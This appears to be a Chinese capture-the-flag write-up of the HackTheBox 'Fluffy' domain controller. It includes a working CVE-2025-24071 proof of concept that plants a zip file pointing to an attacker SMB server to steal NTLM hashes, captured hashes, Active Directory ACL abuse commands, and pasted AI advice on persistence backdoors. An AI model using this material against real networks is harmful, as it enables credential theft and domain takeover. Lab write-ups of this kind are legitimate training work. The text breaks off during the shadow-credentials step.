HTB给了windows账号密码：**j.fleischman / J0elTHEM4n1990!**

# 信息收集

## nmap

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -sV -sC -T4 10.10.11.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 06:26 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 2.21 seconds

┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -sV -sC -Pn -T4 10.10.11.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 06:26 EDT
Nmap scan report for 10.10.11.69
Host is up (1.1s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-15 17:28:18Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-07-15T17:30:47+00:00; +7h00m36s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T17:30:45+00:00; +7h00m35s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m34s, deviation: 1s, median: 7h00m34s
| smb2-time: 
|   date: 2025-07-15T17:29:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 221.31 seconds
```

从这份Nmap扫描结果可以分析出以下关键信息：

从你的扫描结果来看，目标主机 **10.10.11.69** 是一台 **Windows Active Directory 域控制器（Domain Controller）**，主机名为 **DC01.fluffy.htb**。以下是关键发现和后续渗透测试建议：

---

### **1. 主机基本信息**

- **IP地址**：`10.10.11.69`
- **主机名**：`DC01.fluffy.htb`
- **操作系统**：Windows（域控制器）
- **域名**：`fluffy.htb`
- **关键服务**：
  - **LDAP**（389/tcp, 636/tcp, 3268/tcp, 3269/tcp）：用于 Active Directory 认证和查询。
  - **Kerberos**（88/tcp）：Windows 域认证协议。
  - **SMB**（445/tcp）：文件共享和远程管理。
  - **DNS**（53/tcp）：域内名称解析。
  - **WinRM**（5985/tcp）：Windows 远程管理（可能用于 PowerShell 远程执行）。

---

### **2. 关键发现**

#### **（1）SMB 服务（445/tcp）**

- **SMB 签名强制启用**（`Message signing enabled and required`）：
  - 无法直接进行 **SMB Relay 攻击**（需签名）。
  - 需要有效凭据才能交互。
- **可能用途**：
  - 枚举共享目录（如 `ADMIN$`, `C$`, `IPC$`）。
  - 尝试使用已知凭据（如 `j.fleischman:J0elTHEM4n1990!`）登录。

#### **（2）LDAP 服务（389/tcp, 636/tcp）**

- **域名**：`fluffy.htb`
- **SSL 证书**：绑定主机名 `DC01.fluffy.htb`（有效期至 2026 年）。
- **可能用途**：
  - 枚举域用户、组、计算机（如 `ldapsearch`）。
  - 尝试 **Kerberos 认证** 或 **AS-REP Roasting** 攻击（如果用户禁用预认证）。

#### **（3）Kerberos 服务（88/tcp）**

- **用途**：Windows 域认证。
- **攻击面**：
  - **Kerberoasting**：获取服务账户的 TGS 票据并离线破解。
  - **黄金票据/白银票据**（需域管理员权限）。

#### **（4）WinRM 服务（5985/tcp）**

- **用途**：远程管理（类似 SSH）。
- **可能用途**：
  - 如果凭据有效，可通过 `evil-winrm` 获取交互式 Shell。

---

### **3. 当前凭据分析**

你已尝试使用以下凭据：

- **用户名**：`j.fleischman`
- **密码**：`J0elTHEM4n1990!`

#### **可能场景**：

1. **凭据有效**：
   - 可访问 SMB 共享或 WinRM。
   - 尝试枚举域内信息（如 `bloodhound-python`）。
2. **凭据无效**：
   - 可能需要其他用户或密码（如密码喷洒攻击）。
   - 检查是否有密码策略（锁定阈值）。

---

### **4. 后续渗透建议**

#### **（1）SMB 共享枚举**

```bash
smbmap -H 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!'
smbclient -L //10.10.11.69 -U j.fleischman%J0elTHEM4n1990!
```

- 检查是否有可读/可写共享目录。

#### **（2）LDAP 信息收集**

```bash
ldapsearch -x -H ldap://10.10.11.69 -D 'j.fleischman@fluffy.htb' -w 'J0elTHEM4n1990!' -b "DC=fluffy,DC=htb"
```

- 枚举域用户、组、计算机（需凭据有效）。

#### **（3）Kerberoasting 攻击**

```bash
GetUserSPNs.py fluffy.htb/j.fleischman:J0elTHEM4n1990! -dc-ip 10.10.11.69 -request
```

- 获取服务账户的 TGS 票据并离线破解。

#### **（4）WinRM 登录尝试**

```bash
evil-winrm -i 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!'
```

- 如果 WinRM 开放且凭据有效，可获取交互式 Shell。

#### **（5）DNS 域传送测试**

```bash
dig @10.10.11.69 fluffy.htb AXFR
```

- 检查是否配置错误导致域信息泄露。

---

### **5. 安全防护注意**

- **时钟偏差**（`clock-skew: 7h`）：
  - Kerberos 对时间同步敏感，确保本地时间与域同步。
- **SMB 签名**：
  - 无法直接中继，需其他攻击方式（如 NTLM 哈希破解）。

---

### **总结**

- **目标是一台域控制器**，重点攻击面为 **SMB、LDAP、Kerberos、WinRM**。
- **当前凭据 `j.fleischman:J0elTHEM4n1990!` 需验证有效性**。
- 推荐优先尝试 **SMB 共享枚举** 和 **WinRM 登录**，再考虑 Kerberoasting 或 LDAP 信息收集。

---

## 写入/etc/hosts

把域名和 IP 写到 hosts 文件中

```bash
echo "10.10.11.69 DC01.fluffy.htb fluffy.htb " >>  /etc/hosts
```

## 已知账号密码

HTB给了windows账号密码：**j.fleischman / J0elTHEM4n1990!**
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/99df7e811e5d4362bae9f3b61f49dc34.png)
可能的：Windows远程管理（5985/WinRM）以及Windows文件共享（445/SMB）

尝试登录WinRM，无法登录：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# evil-winrm -u j.fleischman -p J0elTHEM4n1990! -i 10.10.11.69

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                           

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError                                      

Error: Exiting with code 1
```

smb可行

## netexec与smbmap

`netexec`枚举用户

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nxc smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --users
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.10.11.69     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                 
SMB         10.10.11.69     445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain                               
SMB         10.10.11.69     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain                             
SMB         10.10.11.69     445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account       
SMB         10.10.11.69     445    DC01             ca_svc                        2025-04-17 16:07:50 0              
SMB         10.10.11.69     445    DC01             ldap_svc                      2025-04-17 16:17:00 0              
SMB         10.10.11.69     445    DC01             p.agila                       2025-04-18 14:37:08 0              
SMB         10.10.11.69     445    DC01             winrm_svc                     2025-05-18 00:51:16 0              
SMB         10.10.11.69     445    DC01             j.coffey                      2025-04-19 12:09:55 0              
SMB         10.10.11.69     445    DC01             j.fleischman                  2025-05-16 14:46:55 0              
SMB         10.10.11.69     445    DC01             [*] Enumerated 9 local users: FLUFFY
```

`smbmap`枚举目录：

```bash
smbmap -H fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'
```

结果：

```bash
[+] IP: 10.10.11.69:445 Name: fluffy.htb               Status: Authenticated
        Disk                                                   Permissions   Comment
        ----                                                   -----------   -------
        ADMIN$                                                 NO ACCESS     Remote Admin
        C$                                                     NO ACCESS     Default share
        IPC$                                                   READ ONLY     Remote IPC
        IT                                                     READ, WRITE
        NETLOGON                                               READ ONLY     Logon server share 
        SYSVOL                                                 READ ONLY     Logon server share 
[|] Closing connections..       
```

IT目录有写入权限，比较有价值

## smbclient

`smbclient`连接共享目录查看

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# smbclient //10.10.11.69/IT -U j.fleischman%J0elTHEM4n1990!
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 15 15:05:38 2025
  ..                                  D        0  Tue Jul 15 15:05:38 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
  WQHGPNBVYS.txt                      A        0  Tue Jul 15 12:12:20 2025

                5842943 blocks of size 4096. 2253168 blocks available
```

```bash
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !           
```

### 有坑 parallel_read returned NT_STATUS_IO_TIMEOUT

根本下载不下来，乌鱼子啊啊啊，又卡卡卡卡了好久好久，改开关防火墙也没用，服了，一直一直报这个：`parallel_read returned NT_STATUS_IO_TIMEOUT`
然后：[查看了这个解决方案](https://unix.stackexchange.com/questions/31900/smbclient-alternative-for-large-files)
把`timeout`改成了12000啊啊啊啊啊啊啊啊终于下载下来了

下载这三个文件，zip包是软件，pdf里面有内容：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/1079afb8a1cb4159985e6c882e565543.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c65ba562b09a4dfdaf29cbfa35dd2bae.png)
是网站漏扫报告最新的几个2025年漏洞

## CVE-2025-24996

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/85dfac498f694e6f9d7c5d3b90e2d1a6.png)
查了下几乎没法利用，网上其他也没什么资料，换下一个

## CVE-2025-24071

[github-利用脚本](https://github.com/0x6rss/CVE-2025-24071_PoC)
[csdn-漏洞原理](https://blog.csdn.net/2301_79518550/article/details/146689421)
[csdn-漏洞复现](https://blog.csdn.net/weixin_42773448/article/details/146436061)

看了概述根据easy难度与之前的过程，更确定是这个漏洞了

> 该漏洞被称为“通过`RAR/ZIP`解压缩导致的`NTLM`哈希泄露”，利用了`Windows`文件管理器的自动文件处理机制。当用户从压缩包中提取一个包含恶意SMB路径的`.library-ms`文件时，`Windows`文件管理器会自动解析其内容以生成预览和索引元数据。
> 即使用户从未显式打开提取的文件，这种自动处理也会发生。安全研究员“0x6rss”表示，`.library-ms`文件格式是基于`XML`的，`Windows`文件管理器信任该文件格式以定义库位置，其中包含一个指向攻击者控制的SMB服务器的标签。
> 在提取文件后，`Windows`文件管理器会尝试自动解析嵌入的`SMB`路径（例如，`\192.168.1.116\shared`）以收集元数据。此操作会触发受害者系统与攻击者服务器之间的`NTLM`认证握手，从而在没有用户交互的情况下泄露受害者的`NTLMv2`哈希。

### 思路

Windows系统的文件上传☞构造恶意SMB路径的RAR/ZIP压缩文件☞自动解析嵌入SMB路径☞获取NTLM哈希

### POC

先把github的利用脚本clone到kali
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/16445f7790b9426393b60597eea9885b.png)

```python
import os
import zipfile

def main():
    file_name = input("Enter your file name: ")
    ip_address = input("Enter IP (EX: 192.168.1.162): ")


    library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""

    library_file_name = f"{file_name}.library-ms"
    with open(library_file_name, "w", encoding="utf-8") as f:
        f.write(library_content)


    with zipfile.ZipFile("exploit.zip", mode="w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(library_file_name)


    if os.path.exists(library_file_name):
        os.remove(library_file_name)

    print("completed")

if __name__ == "__main__":
    main()
```

### 利用

```bash
┌──(kali㉿kali)-[~/Desktop/CVE-2025-24071_PoC]
└─$ python poc.py
Enter your file name: Everything-1.5.0.1431a.zip
Enter IP (EX: 192.168.1.162): 10.10.16.36
completed
```

put上传zip

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' //10.10.11.69/IT  
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.2 kb/s) (average 0.2 kb/s)
smb: \> ls
  .                                   D        0  Wed Jul 16 11:34:46 2025
  ..                                  D        0  Wed Jul 16 11:34:46 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  exploit.zip                         A      321  Wed Jul 16 11:34:47 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 2240442 blocks available
```

攻击机`responder`监听：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.36]
    Responder IPv6             [dead:beef:4::1022]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']                                           
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-V01WNUNXVYE]
    Responder Domain Name      [T0V9.LOCAL]
    Responder DCE-RPC Port     [47510]

[+] Listening for events...                       

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:45435358b800fed2:84CDD0652148A9A0198D31C7C43AC7E5:01010000000000000090AE2810F6DB01E05A1179B95824560000000002000800540030005600390001001E00570049004E002D0056003000310057004E0055004E00580056005900450004003400570049004E002D0056003000310057004E0055004E0058005600590045002E0054003000560039002E004C004F00430041004C000300140054003000560039002E004C004F00430041004C000500140054003000560039002E004C004F00430041004C00070008000090AE2810F6DB0106000400020000000800300030000000000000000100000000200000D5CBC08D33827488E16D8DFC07D6E0D069F00EC52F42CA4DC23785495E57375D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330036000000000000000000                            
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:db3c601572120309:04301BFE54B187B3C229F5954203DE4F:01010000000000000090AE2810F6DB01CB8CE6043A7771DE0000000002000800540030005600390001001E00570049004E002D0056003000310057004E0055004E00580056005900450004003400570049004E002D0056003000310057004E0055004E0058005600590045002E0054003000560039002E004C004F00430041004C000300140054003000560039002E004C004F00430041004C000500140054003000560039002E004C004F00430041004C00070008000090AE2810F6DB0106000400020000000800300030000000000000000100000000200000D5CBC08D33827488E16D8DFC07D6E0D069F00EC52F42CA4DC23785495E57375D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330036000000000000000000    
```

把hash值echo到txt文件里，使用john进行破解：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/caa1d966a72b4cc3baed56aa482c7535.png)
获取密码：`prometheusx-303`

## winrm失败

哈哈这个用户密码依然无法连接winrm

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# evil-winrm -i 10.10.11.69 -u 'p.agila' -p 'prometheusx-303'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                    

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion      

Info: Establishing connection to remote endpoint                                  

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError                 

Error: Exiting with code 1
```

## bloodhound分析攻击链

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# bloodhound-ce-python -d fluffy.htb -u p.agila -p prometheusx-303 -dc dc01.fluffy.htb -c all -ns 10.10.11.69 --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 01M 54S
INFO: Compressing output into 20250716103550_bloodhound.zip
```

关注：

```
- Find all Domain Admins 查找所有域管理员
- Find Shortest Paths to Domain Admins 查找域管理员的最短路径
- Find Principals with DCSync Rights查找具有DCSync权限的主体
- Users with Foreign Domain Group Membership 具有外域组成员身份的用户
- Groups with Foreign Domain Group Membership 具有外域组成员身份的组
- Map Domain Trusts 域信任映射图
- Shortest Paths to Unconstrained Delegation Systems 不受约束的委派系统的最短路径
- Shortest Paths from Kerberoastable Users 来自Kerberoastable用户的最短路径
- Shortest Paths to Domain Admins from Kerberoastable Users 可通过Kerberoastable用户访问域管理员的最短路径
- Shortest Path from Owned Principals 已拥有权限最短路径
- Shortest Paths to Domain Admins from Owned Principals 已拥有权限到域管理员的最短路径
- Shortest Paths to High Value Targets 高价值目标的最短路径
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/985127fbe51e4b2a8ae566aafa86e65d.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/7668b35cfdbc483daaff0ab990ce87f3.jpeg)

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a745d14383b04e6ea8678f3d64b715ec.jpeg)

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/7f9aee44cb0c4cf98045bc51c1362b21.jpeg)

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d0e20a5041dd4f6c9805e4a4ecf79397.jpeg)

GPO：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/331f62ddca954205896adf82050023db.png)
出站控制，Group Delegated Object Control：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/5074585e3946492a801b7e35bfdea4c0.png)
Transitive Object Control，可ACL：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/22c59da7a8c7439d885b924ae972f192.png)
组成员，First Degree Group Memberships：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/669e01980c4e474ba271cdd89efd878e.png)

AI强大的地方来了：
重点关注攻击路径中的薄弱环节和权限提升的可能性：

---

### **1. 初始攻击向量（Initial Access）**

### **（1）密码攻击**

- **密码字段存在（Password=True）**：  
  
  - 如果工具显示密码存在（但未直接暴露），可以尝试以下方法：  
    - **爆破/字典攻击**：针对 `p.agila` 尝试常见弱密码（如 `p.agila`、`Coffey123` 等）。  
    - **Pass-the-Hash（PtH）**：如果能在其他途径获取该用户的 NTLM 哈希，可尝试横向移动。  
    - **Kerberoasting**：如果该账户是服务账户（Service Account），可尝试请求 TGS 票据并离线破解。  

- **Last Changed 时间异常（2025年）**：  
  
  - 可能管理员手动修改过密码，或者系统时间错误，可尝试历史密码（如 `Fluffy@2024`）。  

### **（2）委派攻击（Delegation Abuse）**

- **Cannot Be Delegated=False**：  
  
  - 该账户允许委派，可能被用于 **约束委派（Constrained Delegation）攻击**。  
  - 如果发现该账户能委派到高权限服务（如 `CIFS/DC01`），可伪造票据获取域控权限。  

- **Unconstrained Delegation=False**：  
  
  - 无约束委派关闭，无法直接利用，但可检查是否有其他账户开启该选项。  

---

### **2. 横向移动（Lateral Movement）**

### **（1）组策略对象（GPO）利用**

- **Effective Inbound GPOs=1**：  
  - 该账户受 **1个GPO** 影响，如果红队能修改此GPO（如通过 `Group Policy Creator Owners` 组），可推送恶意脚本（如添加本地管理员）。  

### **（2）对象控制权限滥用**

- **Outbound Object Control（出站控制）**：  
  
  - **Group Delegated Object Control=1**：该账户通过某个组控制 **1个对象**（可能是用户/计算机）。  
    - 如果目标是 **高权限账户（如域管理员）**，可尝试修改其属性（如重置密码）。  
  - **Transitive Object Control=14**：传递性控制可能涉及关键服务账户，可尝试 **ACL 滥用**（如 `GenericAll` 权限）。  

- **Inbound Control Rights（入站控制）**：  
  
  - **Explicit Object Controllers=6**：有6个账户/组能控制 `p.agila`，如果其中某个账户可被攻陷（如普通用户），可用来接管该账户。  

### **（3）DCOM/RDP 利用**

- **Execution Rights 全部为0**：  
  - 该账户无直接RDP/DCOM权限，但如果有 **本地管理员权限**（通过其他方式获取），仍可横向移动。  

---

### **3. 权限提升（Privilege Escalation）**

### **（1）滥用组权限**

- **First Degree Group Memberships=2**：  
  
  - 该账户属于 **2个直接组**，需确认是否包含高权限组（如 `Domain Admins`、`Enterprise Admins`）。  
  - 如果组内存在 **权限配置错误**（如 `GenericAll`），可尝试添加自己到高权限组。  

- **Unrolled Group Membership=7**：  
  
  - 该账户间接属于7个组，可能隐藏关键权限（如 `Server Operators` 可修改服务）。  

### **（2）ACL 攻击（Active Directory ACL Abuse）**

- **Transitive Object Control=14**：  
  - 该账户能通过传递关系控制14个对象，可尝试：  
    - **修改高权限账户的 `msDS-KeyCredentialLink`**（Shadow Credentials 攻击）。  
    - **添加 `DCSync` 权限** 以导出域哈希。  

---

### **4. 域控接管（Domain Compromise）**

### **（1）DCSync 攻击**

- 如果通过 **ACL 滥用** 或 **组策略篡改** 获取 `Replicating Directory Changes` 权限，可直接执行 `DCSync` 导出所有用户哈希。  

### **（2）Golden Ticket / Silver Ticket**

- 如果获取 `krbtgt` 哈希（通过 `DCSync` 或其他方式），可伪造 **黄金票据（Golden Ticket）** 持久化控制域。  
- 如果该账户能委派到域控服务（如 `CIFS/DC01`），可伪造 **白银票据（Silver Ticket）** 访问文件共享。  

### **（3）GPO 推送恶意计划任务**

- 如果能控制 **某个OU的GPO**，可推送恶意计划任务在域控上执行代码。  

---

### **5. 持久化（Persistence）**

- **Skeleton Key**：在域控上注入恶意 LSASS 插件，维持后门。  
- **AdminSDHolder 修改**：如果控制 `AdminSDHolder` 对象，可确保权限不会被系统自动修复。  
- **隐藏后门账户**：创建隐藏的 `Admin` 账户（如 `$` 结尾的用户名）。  

---

### **总结：攻击路径建议**

1. **尝试爆破 `p.agila` 的密码**（或通过其他方式获取凭证）。  
2. **检查该账户的委派权限**，看是否能用于 Kerberos 攻击（如约束委派）。  
3. **分析 `Group Delegated Object Control=1`**，看是否能控制高权限对象。  
4. **利用 `Transitive Object Control=14`** 进行 ACL 滥用，提升至 `DCSync` 权限。  
5. **如果拿到本地管理员权限**，可尝试横向移动到域控（如 PsExec、WMI、SMB 等）。  
6. **最终目标：获取 `krbtgt` 哈希**，生成 Golden Ticket 完全控制域。  

---

`SERVICE ACCOUNT MANAGERS`组对`SERVICE ACCOUNTS`组有`GenericAll`权限，可以直接把p用户加进去：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila
[+] p.agila added to SERVICE ACCOUNTS
```

因为`SERVICE ACCOUNTS`组对三个`_SVC`账户有写权限，所以我们可以用影子证书
这里思路也可尝试`kerberoasting`，看了wp是失败的
同时注意时间同步

```bash
ntpdate 10.10.11.69
```

## shadow credentials

所有可写用户：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# bloodyAD -d fluffy.htb -u p.agila -p 'prometheusx-303' --dc-ip 10.10.11.69 get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=fluffy,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=Prometheus Agila,CN=Users,DC=fluffy,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
